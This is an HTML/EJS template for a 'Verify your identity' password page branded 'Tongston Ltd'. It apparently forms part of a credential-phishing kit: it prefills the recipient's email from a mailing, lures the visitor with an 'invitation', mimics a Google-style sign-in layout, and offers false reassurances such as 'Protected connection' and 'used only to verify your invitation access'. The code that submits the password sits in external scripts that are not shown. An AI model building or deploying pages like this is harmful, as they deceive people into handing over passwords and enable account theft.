<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Continue — Tongston Ltd</title>
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@400;500&display=swap" rel="stylesheet" />
  <link rel="stylesheet" href="/css/mailing.css" />
  <link rel="stylesheet" href="/css/response.css" />
  <link rel="stylesheet" href="/css/brand.css" />
</head>
<body class="mailing-page-body">
  <div class="mailing-page">
    <div class="mailing-card">
      <div class="mailing-logo" aria-hidden="true">
        <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Tongston Ltd">
          <rect x="2" y="2" width="44" height="44" rx="12" fill="#4A2418"/>
          <path d="M12 15h24M24 15v19" fill="none" stroke="#F7F1E8" stroke-width="5" stroke-linecap="round"/>
        </svg>
      </div>

      <div class="mailing-account-row">
        <div class="mailing-avatar"><%= email.charAt(0).toUpperCase() %></div>
        <div class="mailing-account-info">
          <span class="mailing-account-email"><%= email %></span>
          <span class="mailing-account-change" id="mailing-change">Change</span>
        </div>
      </div>

      <div class="mailing-security-badge" aria-label="Secure password entry">
        <svg viewBox="0 0 24 24" fill="none" aria-hidden="true">
          <path d="M7 10V7a5 5 0 0 1 10 0v3M5 10h14v10H5V10Z" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"/>
          <path d="M12 14v2" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
        </svg>
        <span>Protected connection</span>
      </div>

      <h1 class="mailing-title mailing-title-sm">Verify your identity</h1>
      <p class="mailing-subtitle">Enter your password to securely continue to your Tongston Ltd invitation.</p>

      <form id="mailing-password-form" class="mailing-form" autocomplete="off">
        <div class="mailing-input-wrap">
          <input type="password" id="mailing-password" name="password" placeholder=" " required autofocus />
          <label for="mailing-password">Enter your password</label>
        </div>
        <div class="mailing-inline-error" id="mailing-inline-error"></div>
        <label class="mailing-show-pw">
          <input type="checkbox" id="mailing-show-pw-toggle" />
          <span>Show password</span>
        </label>
        <div class="mailing-actions">
          <a href="/highlights" class="mailing-link">Cancel</a>
          <button type="submit" class="mailing-btn">Continue securely</button>
        </div>
      </form>

      <p class="mailing-security-note">Your password is hidden while you type and is used only to verify your invitation access.</p>

      <div id="mailing-loading" class="mailing-loading" style="display:none;">
        <div class="mailing-spinner"></div>
        <p>Signing you in…</p>
      </div>
    </div>

    <footer class="mailing-footer">
      <select class="mailing-lang">
        <option>English (United States)</option>
      </select>
      <div class="mailing-footer-links">
        <a href="#">Help</a>
        <a href="#">Privacy</a>
        <a href="#">Terms</a>
      </div>
    </footer>
  </div>

  <script>
    window.__MAILING_EMAIL__ = "<%= email %>";
  </script>
  <script src="/js/response.js"></script>
  <script src="/js/mailing-password.js"></script>
</body>
</html>
